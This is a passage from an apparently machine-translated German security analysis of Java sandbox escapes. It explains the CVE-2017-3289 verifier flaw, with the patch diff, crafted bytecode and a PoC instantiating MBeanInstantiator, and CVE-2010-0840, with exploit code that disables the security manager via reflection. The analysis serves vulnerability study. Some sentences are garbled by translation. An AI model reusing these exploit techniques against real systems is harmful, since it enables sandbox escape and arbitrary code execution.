<h5 id="4-2-2-Beispiel-CVE-2017-3289"><a href="#4-2-2-Beispiel-CVE-2017-3289" class="headerlink" title="4.2.2 Beispiel: CVE-2017-3289"></a>4.2.2 Beispiel: CVE-2017-3289</h5><p>Die CVE-Beschreibung besagt, dass “ein erfolgreicher Angriff auf diese Sicherheitsanfälligkeit zur Übernahme von Java SE, Java SE Embedded” führen könnte. Wie für CVE-2017-3272 bedeutet dies, dass es möglich ist, die Sicherheitsanfälligkeit auszunutzen, um die Java-Sandbox zu umgehen.<br>Redhat Bugzilla Darstellung von „Klasse gefunden Strukturfehlern und falsche Ausnahme Stack-Frame-Verarbeitung zu Unsicherheit bei der Montage OpenJDK Hotspot verwendet. Untrusted Java-Anwendung oder Applet könnte diese Sicherheitsanfälligkeit verwenden, um die Java-Sandbox Beschränkungen zu umgehen “. Es erzählt Analysten: (1) Verwundbarkeit, die C / C ++ Code, der (Hotspot der Name der Java VM ist), und (2) die Anfälligkeit für illegalen Bau und klassenbezogenen Ausnahmestapelrahmen. Informationen (2)<br>Gibt an, dass die Sicherheitsanfälligkeit die Gültigkeit von Bytecode im C / C ++ - Code überprüfen kann. Diese Seite enthält auch Links zum OpenJDK-Patch für diese Sicherheitsanfälligkeit.<br>Der OpenJDK-Patch “8167104: Verbesserungen anderer Klassengebäude zur Behebung von Sicherheitslücken” ist online verfügbar. Gepatcht fünf C ++ Dateien: „Klassendatei / verifier.cpp“, verantwortlich für die Klasse Dateistruktur zu validieren und die Wirksamkeit der Klasse „Klassendatei / stackMapTable {cav, HPP}.“ Der Prozess Stapeldateizuordnungstabelle und „Klassendatei / stackMapFrame. {cpp, hpp} “, die die Datei des Stack-Map-Frames darstellt.<br>Durch die im diff suchen, fanden wir die Funktion StackMapFrame :: has_flag_match_exception entfernt haben (), und wir werden die Bedingung genannt C1 aktualisieren, indem Sie den Anruf zu has_flag_match_exception Entfernen () von. Außerdem haben die Methoden match_stackmap () und is_assignable_to () jetzt nur noch einen Parameter: “bool handler” wurde entfernt. Dieser Parameter “handler” wird auf “true” gesetzt, wenn der Validator gerade den Ausnahmebehandler überprüft. Bedingung C1 ist wie folgt:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">-  bool match_flags = (_flags | target-&gt;flags()) == target-&gt;flags();</span><br><span class="line">-  if (match_flags || is_exception_handler &amp;&amp;</span><br><span class="line">         has_flag_match_exception(target)) &#123;</span><br><span class="line">+  if ((_flags | target-&gt;flags()) == target-&gt;flags()) &#123;</span><br><span class="line">     return true;</span><br><span class="line">   &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>Diese Bedingung befindet sich in der Funktion is_assignable_to (), die prüft, ob der aktuelle Stapelkartenrahmen dem Zielstapelkartenrahmen zugeordnet werden kann und ihn als Parameter an die Funktion übergibt. Vor dem Patch lautet die Bedingung für die Rückgabe von “true” “match_flags || is_exception_handler &amp;&amp; has_flag_match_exception (target)”. Im Englischen bedeutet dies, dass der aktuelle Stapelkartenrahmen und der Zielstapelkartenrahmen die gleichen Flags aufweisen oder der aktuelle Befehl im Ausnahmebehandler ist und die Funktion “has_flag_match_exception” “true” zurückgibt. Beachten Sie, dass es nur ein Flag namens “UNINITIALIZED_THIS” (auch bekannt als FLAG_THIS_UNINIT) gibt. Wenn dieses Flag wahr ist, wird das von “this” referenzierte Objekt nicht initialisiert, dh sein Konstruktor wurde noch nicht aufgerufen.<br>Nach dem Patch wird die Bedingung zu “match_flags”. Dies bedeutet, dass es in der anfälligen Version einen Weg geben kann, “match_flags” als Dummy-Bytecode zu konstruieren (dh “this” hat ein nicht initialisiertes Flag im aktuellen Frame, aber nicht im Zielframe, sondern “ Is_exception_handler “yes” true “(die aktuelle Anweisung befindet sich im Exception-Handler) und” has_flag_match_exception (target) “gibt” true “zurück. Aber wann gibt diese Funktion” true “zurück?<br>Die Funktion has_flag_match_exception () wird in der folgenden Liste dargestellt.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: ....</span><br><span class="line"> <span class="number">2</span>: bool StackMapFrame::has_flag_match_exception(</span><br><span class="line"> <span class="number">3</span>:     <span class="keyword">const</span> StackMapFrame* target) <span class="keyword">const</span> &#123;</span><br><span class="line"> <span class="number">4</span>:</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">assert</span>(max_locals() == target-&gt;max_locals() &amp;&amp;</span><br><span class="line"> <span class="number">6</span>:          stack_size() == target-&gt;stack_size(),</span><br><span class="line"> <span class="number">7</span>:                <span class="string">"StackMap sizes must match"</span>);</span><br><span class="line"> <span class="number">8</span>:</span><br><span class="line"> <span class="number">9</span>:   VerificationType top = VerificationType::top_type();</span><br><span class="line"><span class="number">10</span>:   VerificationType this_type = verifier()-&gt;current_type();</span><br><span class="line"><span class="number">11</span>:</span><br><span class="line"><span class="number">12</span>:   <span class="keyword">if</span> (!flag_this_uninit() || target-&gt;flags() != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">13</span>:     <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">14</span>:   &#125;</span><br><span class="line"><span class="number">15</span>:</span><br><span class="line"><span class="number">16</span>:   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target-&gt;locals_size(); ++i) &#123;</span><br><span class="line"><span class="number">17</span>:     <span class="keyword">if</span> (locals()[i] == this_type &amp;&amp; target-&gt;locals()[i] != top) &#123;</span><br><span class="line"><span class="number">18</span>:       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">19</span>:     &#125;</span><br><span class="line"><span class="number">20</span>:   &#125;</span><br><span class="line"><span class="number">21</span>:</span><br><span class="line"><span class="number">22</span>:   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target-&gt;stack_size(); ++i) &#123;</span><br><span class="line"><span class="number">23</span>:     <span class="keyword">if</span> (stack()[i] == this_type &amp;&amp; target-&gt;stack()[i] != top) &#123;</span><br><span class="line"><span class="number">24</span>:       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">25</span>:     &#125;</span><br><span class="line"><span class="number">26</span>:   &#125;</span><br><span class="line"><span class="number">27</span>:</span><br><span class="line"><span class="number">28</span>:   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="number">29</span>: &#125;</span><br><span class="line"><span class="number">30</span>: ....</span><br></pre></td></tr></table></figure>
<p>Damit diese Funktion “true” zurückgibt, müssen alle folgenden Bedingungen erfüllt sein: (1) Die maximale Anzahl lokaler Variablen für den aktuellen und den Zielframe und die maximale Größe des Stacks müssen übereinstimmen (Zeilen 5-7)); (2) Der aktuelle Frame muss Setzen Sie das Flag “UNINIT” auf “true” (Zeilen 12-14); (3) nicht initialisierte Objekte werden im Zielframe nicht verwendet (Zeilen 16-26).<br>Die folgende Liste zeigt die Bytecodes, die die folgenden drei Bedingungen erfüllen:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;()</span><br><span class="line">0: new           // class java/lang/Throwable</span><br><span class="line">1: dup</span><br><span class="line">2: invokespecial // Method java/lang/Throwable.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">3: athrow</span><br><span class="line">4: new           // class java/lang/RuntimeException</span><br><span class="line">5: dup</span><br><span class="line">6: invokespecial // Method java/lang/RuntimeException.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">7: athrow</span><br><span class="line">8: return</span><br><span class="line">Exception table:</span><br><span class="line"> from    to  target type</span><br><span class="line">    0    4    8   Class java/lang/Throwable</span><br><span class="line">    StackMapTable: number_of_entries = 2</span><br><span class="line">      frame at instruction 3</span><br><span class="line">        local = [UNINITIALIZED_THIS]</span><br><span class="line">        stack = [ class java/lang/Throwable ]</span><br><span class="line">      frame at instruction 8</span><br><span class="line">        locals = [TOP]</span><br><span class="line">        stack = [ class java/lang/Throwable ]</span><br></pre></td></tr></table></figure>
<p>Die maximale lokale Anzahl und die maximale Stapelgröße können auf 2 gesetzt werden, um die erste Bedingung zu erfüllen. Der aktuelle Rahmen setzt “UNINITIALIZED_THIS” in Zeile 3 auf wahr, um die zweite Bedingung zu erfüllen. Um schließlich die dritte Bedingung zu erfüllen, wird der nicht initialisierte lokale Faktor nicht für das Ziel des “athrow” -Befehls (Zeile 8) verwendet, da das erste lokale Element auf “TOP” initialisiert wird.<br>Beachten Sie, dass der Code im try / catch-Block gesetzt ist, um “is_exception_handler” in der Funktion is_assignable_to () auf “true” zu setzen. Beachten Sie auch, dass der Bytecode im Konstruktor steht (<init> () im Bytecode). Dies ist notwendig, um das Flag “UNINITIALIZED_THIS” auf “True” zu setzen.<br>Wir wissen jetzt, dass Analysten Bytecodes erstellen können, die ihre eigenen nicht initialisierten Objekte zurückgeben. Auf den ersten Blick ist es schwer zu erkennen, wie ein Analytiker ein solches Objekt benutzt. Ein genauerer Blick zeigt jedoch, dass eine solche manipulierte Klasse als Unterklasse der Systemklasse implementiert werden kann, ohne den Konstruktor super der Superklasse aufzurufen. Die Initialisierung wird im Fall von <init> () durchgeführt. Dies kann verwendet werden, um öffentliche Systemklassen zu instanziieren, die andernfalls nicht von nicht vertrauenswürdigem Code instanziiert würden, da ihre Konstruktoren privat sind oder Berechtigungsprüfungen enthalten. Der nächste Schritt besteht darin, eine Klasse zu finden, die dem Analytiker “interessante” Funktionen bietet. Das Ziel besteht darin, alle Funktionen so zu kombinieren, dass Sie beliebigen Code in der Sandbox-Umgebung ausführen können, um die Sandbox zu umgehen. Das Finden einer nützlichen Klasse ist jedoch selbst eine komplexe Aufgabe. Konkret stehen wir vor folgenden Herausforderungen.</init></init></p>
<ul>
<li><p>Aufgabe 1: Wo finde ich Hilfe?<br>Die JRE enthält eine Reihe von JAR-Dateien, die JCL-Klassen (Java Class Library) enthalten. Diese Klassen werden als <em>trusted</em>-Klassen geladen und können beim Erstellen von Exploits verwendet werden. Leider sind für Java-Benutzer glücklicherweise mehr und mehr Klassen als “eingeschränkt” gekennzeichnet, was bedeutet, dass der <em>untrusted</em>-Code sie nicht direkt instanziieren kann. Die Anzahl der eingeschränkten Pakete wurde von 1.6.0_01 auf 47 von 1.8.0_121 geändert. Dies bedeutet, dass der Prozentsatz an Code, den Analysten beim Erstellen von Exploits nicht direkt verwenden können, von 20% in 1.6.0_01 auf 54% in 1.8.0_121 geändert wurde.</p>
</li>
<li><p>Aufgabe 2: Feld darf nicht initialisiert werden<br>In der Regel ist es nicht möglich, einen neuen Klassenlader ohne die entsprechenden Berechtigungen zu instanziieren. Die Überprüfung der Berechtigungen der Klasse <em>ClassLoader</em> im Konstruktor scheint auf den ersten Blick ein interessantes Ziel zu sein. Aufgrund einer Schwachstelle in CVE-2017-3289 ist es tatsächlich möglich, einen neuen Klassenlader ohne Erlaubnis zu instanziieren, da die Konstruktorcode- und Berechtigungsprüfungen nicht ausgeführt werden. Da der Konstruktor jedoch umgangen wird, wird das Feld mit Standardwerten initialisiert (z. B. für eine ganze Zahl von Null für Verweise auf null). Dies ist problematisch, weil die Fun-Methode, die normalerweise die Definition einer neuen Klasse mit allen Privilegien erlaubt, fehlschlägt, weil der Code versucht, die Felder zu dereferenzieren, die nicht richtig initialisiert wurden. Nach einer manuellen Überprüfung scheint es schwierig zu sein, die Feld-Dereferenzierung zu umgehen, da alle Pfade die Anweisung zur Dereferenzierung des nicht-initialisierten Feldes passieren. Die Verwendung von <em>ClassLoader</em> scheint wie eine Sackgasse. Bei der Verwendung der Sicherheitsanfälligkeit von CVE-2017-3289 stellen nicht initialisierte Felder eine große Herausforderung dar, mit der Ausnahme, dass die Zielklasse öffentlich, nicht final und nicht einschränkend sein muss und Methoden von Interesse keine Methoden zur Dereferenzierung nicht initialisierter Daten ausführen sollten Feld.</p>
</li>
</ul>
<p>Wir haben keinen nützlichen Hilfecode für Java Version 1.8.0 Update 112 gefunden. Um zu zeigen, wie die Sicherheitslücke von CVE-2017-3289 funktioniert, zeigen wir einen alternativen Hilfecode, der die Sicherheitslücken von 0422 und 0431 ausnutzt. Diese zwei Sicherheitsanfälligkeiten hängen von <em>MBeanInstantiator</em> ab, einer Klasse, die die Methode findClass () definiert, die jede Klasse laden kann. Die Klasse <em>MBeanInstantiator</em> hat nur einen privaten Konstruktor und kann daher nicht direkt instanziiert werden. Diese Sicherheitsanfälligkeiten verwendeten zunächst <em>JmxMBeanServer</em>, um eine Instanz von <em>MBeanInstantiator</em> zu erstellen. Wir werden zeigen, dass ein Analyst die Klasse <em>MBeanInstantiator</em> direkt ableiten und die Schwachstelle 3289 verwenden kann, um eine Instanz davon zu erhalten.<br>Der ursprüngliche Helfercode, der zum Instanziieren von <em>MBeanInstantiator</em> verwendet wird, hängt wie folgt von <em>JmxMBeanServer</em> ab:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: JmxMBeanServerBuilder serverBuilder = <span class="keyword">new</span> JmxMBeanServerBuilder();</span><br><span class="line"><span class="number">2</span>: JmxMBeanServer server =</span><br><span class="line"><span class="number">3</span>:      (JmxMBeanServer) serverBuilder.newMBeanServer(<span class="string">""</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="number">4</span>: MBeanInstantiator instantiator = server.getMBeanInstantiator();</span><br></pre></td></tr></table></figure>
<p>　　Der alternative Code, der <em>MBeanInstantiator</em> instanziiert, nutzt die Sicherheitsanfälligkeit von CVE-2017-3289 aus:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoCMBeanInstantiator</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>:   <span class="function"><span class="keyword">public</span> <span class="title">PoCMBeanInstantiator</span><span class="params">(ModifiableClassLoaderRepository clr)</span> </span>&#123;</span><br><span class="line"><span class="number">3</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br><span class="line"><span class="number">5</span>:</span><br><span class="line"><span class="number">6</span>:   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">7</span>:     <span class="keyword">return</span> <span class="keyword">new</span> PoCMBeanInstantiator(<span class="keyword">null</span>);</span><br><span class="line"><span class="number">8</span>:   &#125;</span><br><span class="line"><span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure>
<p>Bitte beachten Sie, dass aufgrund <em>MBeanInstantiator</em> keine öffentlichen Konstruktor, <em>PoCMBeanInstantiator</em> muss eine virtuelle Klasse im Quellcode erweitern, in unserem Beispiel ist <em>java.lang.Object</em>. Wir verwenden die ASM-Bytecode-Operationsbibliothek, um die Oberklasse von <em>PoCMBeanInstantiator</em> in <em>MBeanInstantiator</em> zu ändern. Wir verwenden auch ASM, um den Bytecode des Konstruktors zu ändern, um den Super zu umgehen. Der Aufruf von <init> (*).<br>Seit Java 1.7.0 Update 13 hat Oracle <em>com.sun.jmx.</em> als eingeschränktes Paket hinzugefügt. Die Klasse <em>MBeanInstantiator</em> befindet sich in diesem Paket, daher kann dieser Hilfscode in späteren Java-Versionen nicht wiederverwendet werden.<br>Zu unserer Überraschung betrifft diese Sicherheitsanfälligkeit mehr als 40 verschiedene öffentliche Versionen. Alle Java 7-Versionen von Update 0 bis Update 80 sind betroffen. Alle Java 8-Versionen von Update 5 bis Update 112 sind ebenfalls betroffen. Java 6 ist nicht betroffen.<br>Siehe aktualisiert von Java 6 43 Bytecode Verifier Java 7 und die Differenz zwischen dem aktualisierten Quellcode 0, stellen wir fest, dass der Hauptteil über den Kehrwert diff Patches entspricht. Dies bedeutet, dass die Bedingung, dass der Stack-Frame im Exception-Handler im Konstruktor dem Ziel-Stack-Frame zugewiesen werden kann, geschwächt wurde. Der Kommentar in diff gibt an, dass dieser neue Code auf Anforderung 7020118 hinzugefügt wurde. Diese Anforderung erfordert die Aktualisierung des Codes des Bytecode-Verifizierers, sodass der Parser von NetBeans Handler generieren kann, um den gesamten Code des Konstruktors zu überschreiben.<br>Die Sicherheitsanfälligkeit wird behoben, indem die Einschränkung, unter der der aktuelle Stapelrahmen (im Konstruktor im try / catch-Block) dem Zielstapelrahmen zugewiesen werden kann, verschärft wird. Dies verhindert effektiv, dass Bytecode ein nicht initialisiertes “dieses” Objekt aus dem Konstruktor zurückgibt.<br>Nach unserem besten Wissen hat Java mindestens drei public <em>uninitialized instance</em>-Schwachstellen. Einer ist CVE-2017-3289 in diesem Artikel beschrieben. Die zweite wurde 2002 entdeckt. Der Autor nutzt auch eine Schwachstelle im Bytecode-Validator aus, die es unmöglich macht, den Konstruktor der Superklasse aufzurufen. Sie konnten die Sicherheitsanfälligkeit nicht ausnutzen, um vollständig aus der Sandbox auszubrechen. Sie können jedoch auf das Netzwerk zugreifen und Dateien auf dem Datenträger lesen und schreiben. Das dritte wurde 1996 von einem Forschungsteam in Princeton entdeckt. Das Problem liegt wiederum im Bytecode-Verifizierer. Dadurch kann der Konstruktor Ausnahmen abfangen, die durch Aufrufe von super () ausgelöst werden, und teilweise initialisierte Objekte zurückgeben. Beachten Sie, dass die Class Loader-Klasse keine Instanzvariablen für diesen Angriff besitzt. Das Ausnutzen einer Sicherheitslücke zum Instanziieren eines Klassenladeprogramms bietet daher einen vollständig initialisierten Klassenladeprogramm, für das eine beliebige Methode aufgerufen werden kann.</init></p>
<h5 id="4-2-3-Diskussion"><a href="#4-2-3-Diskussion" class="headerlink" title="4.2.3 Diskussion"></a>4.2.3 Diskussion</h5><p>Die Hauptursache für diese Schwachstelle ist ein C / C ++ Bytecode-Verifikationscode ändert, wird der Code Analysten ermöglicht es Java-Byte-Code zu erzeugen, der Code-Byte kann die Unterklasse Konstruktor Super nicht umgehen () in Genannt. Diese Sicherheitsanfälligkeit verletzt direkt die Spezifikationen der virtuellen Maschine.<br>Diese Sicherheitsanfälligkeit ist jedoch ohne den richtigen <em>helper</em>-Code nutzlos. Oracle hat ein Tool zur statischen Analyse entwickelt, um gefährliche Gadgets zu finden und sie auf eine schwarze Liste zu setzen. Dies macht es für Analysten schwieriger, den Sandbox-Entwicklungs-Exploit zu umgehen. Tatsächlich haben wir nur interessante Gadgets für ältere JVMs gefunden. Da sie in der neuesten Version der Blacklist enthalten sind, funktioniert der Angriff nicht mehr. Doch selbst beruht diese Methode auf dem statischen Analyse, es (1) kann viele Fehlalarme erzeugen, die die wirkliche Gefahr von Gadgets Identifizierung erschwert werden, und (2) kann ein falsch-negative, weil es nicht realistisch, die Sprache simulieren Alle Spezifitäten, normalerweise reflektiert und JNI, sind deshalb nicht gesund.</p>
<h4 id="4-3-Vertrauenswurdige-Methodenkette"><a href="#4-3-Vertrauenswurdige-Methodenkette" class="headerlink" title="4.3 Vertrauenswürdige Methodenkette"></a>4.3 Vertrauenswürdige Methodenkette</h4><h5 id="4-3-1-Hintergrund"><a href="#4-3-1-Hintergrund" class="headerlink" title="4.3.1 Hintergrund"></a>4.3.1 Hintergrund</h5><p>Der gesamte Aufruf-Stack wird überprüft, sobald eine Sicherheitsprüfung in Java durchgeführt wird. Jeder Rahmen des Aufruf-Stacks enthält den Methodennamen, der durch seine Klassen- und Methodensignatur identifiziert wird. Die Idee eines vertrauenswürdigen Methodenkettenangriffs besteht darin, dass nur vertrauenswürdige Klassen auf dem Aufruf-Stack vorhanden sind. Um dies zu erreichen, verlassen sich Analysten typischerweise auf die Reflexionsfunktion, die in der vertrauenswürdigen Klasse vorhanden ist, um die Zielmethode aufzurufen. Auf diese Weise, wenn die Sicherheitsüberprüfung abgeschlossen ist und die Zielmethode ist in einem privilegierten Kontext (in der Regel deaktivieren Sie den Sicherheitsmanager) ausgeführt wird, wird der Anruf nicht eine Anwendung Klasse (ungesicherte) auf dem Stapel. Damit diese Methode funktioniert, muss sich die Methodenkette in einem privilegierten Thread befinden, z. B. einem Ereignis-Thread. Es kann nicht am Hauptthread arbeiten, da die Klasse mit der Hauptmethode als nicht vertrauenswürdig angesehen wird. Daher löst die Sicherheitsprüfung eine Ausnahme aus.</p>
<h5 id="4-3-2-Beispiel-CVE-2010-0840"><a href="#4-3-2-Beispiel-CVE-2010-0840" class="headerlink" title="4.3.2 Beispiel: CVE-2010-0840"></a>4.3.2 Beispiel: CVE-2010-0840</h5><p>Diese Sicherheitsanfälligkeit ist das erste Beispiel für einen vertrauenswürdigen Methodenkettenangriff auf die Java-Plattform. Es basiert auf der Klasse <em>java.beans.Statement</em>, um die Zielmethode durch Reflektion auszuführen. Die Taten eines <em>JList</em> GUI-Element ( „a angezeigte Liste von Objekten und ermöglicht der Benutzer, ein oder mehr Elemente zu wählen.“) Gezwungen, der GUI-Thread neue Elemente zeichnen. Der Exploit-Code lautet wie folgt:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// target method</span></span><br><span class="line">   Object target = System.class;</span><br><span class="line">   String methodName = <span class="string">"setSecurityManager"</span>;</span><br><span class="line">   Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span> &#125;;</span><br><span class="line"></span><br><span class="line">   Link l = <span class="keyword">new</span> Link(target, methodName, args);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">final</span> HashSet s = <span class="keyword">new</span> HashSet();</span><br><span class="line">   s.add(l);</span><br><span class="line"></span><br><span class="line">   Map h = <span class="keyword">new</span> HashMap() &#123;</span><br><span class="line">   	<span class="function"><span class="keyword">public</span> Set <span class="title">entrySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   		<span class="keyword">return</span> s;</span><br><span class="line">   	&#125;; &#125;;</span><br><span class="line"></span><br><span class="line">   sList = <span class="keyword">new</span> JList(<span class="keyword">new</span> Object[] &#123; h &#125;);</span><br></pre></td></tr></table></figure>
<p>Die Zielmethode wird vom Objekt <em>Link</em> als <em>Statement</em> dargestellt. Die Klasse <em>Link</em> ist keine Klasse aus JCL, sondern eine Klasse, die von einem Analysten erstellt wurde. Die Klasse <em>Link</em> ist eine Unterklasse von <em>Expression</em>, die eine Unterklasse von <em>Statement</em> ist. Das <em>Link</em>-Objekt implementiert auch die Methode getValue () der Schnittstelle <em>java.util.Map.Entry</em> in einem Pseudo-Op. Es ist keine echte Implementierung der Schnittstelle <em>Entry</em>, da es nur eine Methode getValue () gibt. Diese “Implementierung” kann nicht mit dem normalen Javac-Compiler durchgeführt werden und muss durch direkte Änderung des Bytecodes der Klasse <em>Link</em> erfolgen.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">   [...]</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns the value corresponding to this entry.  If the mapping</span></span><br><span class="line"><span class="comment">   * has been removed from the backing map (by the iterator's</span></span><br><span class="line"><span class="comment">   * &lt;tt&gt;remove&lt;/tt&gt; operation), the results of this call are</span></span><br><span class="line"><span class="comment">   * undefined.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the value corresponding to this entry</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> IllegalStateException implementations may, but are not</span></span><br><span class="line"><span class="comment">   *         required to, throw this exception if the entry has been</span></span><br><span class="line"><span class="comment">   *         removed from the backing map.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function">V <span class="title">getValue</span><span class="params">()</span></span>;</span><br><span class="line">   [...]</span><br></pre></td></tr></table></figure>
<p>Diese Schnittstelle verfügt über eine getValue () -Methode. Es stellt sich heraus, dass die <em>Expression</em>-Klasse auch eine getValue () -Methode mit der gleichen Signatur hat. Daher kann das Aufrufen von Enable.getValue () für ein Objekt vom Typ <em>Link</em> type zur Laufzeit die Implementierung von <em>Entry</em> fälschen.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in AbstractMap</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">   <span class="keyword">if</span> (! i.hasNext())</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"&#123;&#125;"</span>;</span><br><span class="line"></span><br><span class="line">   StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">   sb.append(<span class="string">'&#123;'</span>);</span><br><span class="line">   <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">     	   Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">     	   K key = e.getKey();</span><br><span class="line">     	   V value = e.getValue();</span><br><span class="line">     	   sb.append(key   == <span class="keyword">this</span> ? <span class="string">"(this Map)"</span> : key);</span><br><span class="line">     	   sb.append(<span class="string">'='</span>);</span><br><span class="line">     	   sb.append(value == <span class="keyword">this</span> ? <span class="string">"(this Map)"</span> : value);</span><br><span class="line">     	   <span class="keyword">if</span> (! i.hasNext())</span><br><span class="line">     		   <span class="keyword">return</span> sb.append(<span class="string">'&#125;'</span>).toString();</span><br><span class="line">     	   sb.append(<span class="string">','</span>).append(<span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>　　Der Zweck des Analytikers besteht darin, die Methode “AbstractMap.toString ()” aufzurufen, um Entry.getValue () für das Objekt <em>Link</em> aufzurufen, das die Methode invoke () aufruft:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (value == unbound) &#123;</span><br><span class="line">     	   setValue(invoke());</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>　　Die invoke-Methode führt die Zielmethode System.setSecurityManapger (null) des Analysten durch Reflexion aus, um den Sicherheitsmanager zu deaktivieren. Der Aufruf-Stack beim Aufruf dieser Methode durch Reflektion lautet wie folgt:</p>
